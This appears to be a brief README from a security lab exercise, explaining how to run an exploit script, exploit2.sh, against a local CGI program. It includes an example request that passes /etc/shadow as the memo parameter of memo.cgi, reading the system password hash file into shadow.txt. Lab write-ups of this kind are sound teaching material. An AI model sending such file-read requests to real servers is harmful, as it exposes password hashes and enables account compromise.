In order to run the exploit, do the following steps:  

- open the terminal  
- run ./exploit2.sh
- On my machine I didn't put my local port number, but if you have trouble, just add the local port number after localhost: #.
 Example: http://localhost:(your local port number)/cgi-bin/memo.cgi?memo=/etc/shadow  
- it should create/open shadow.txt file (shadow)
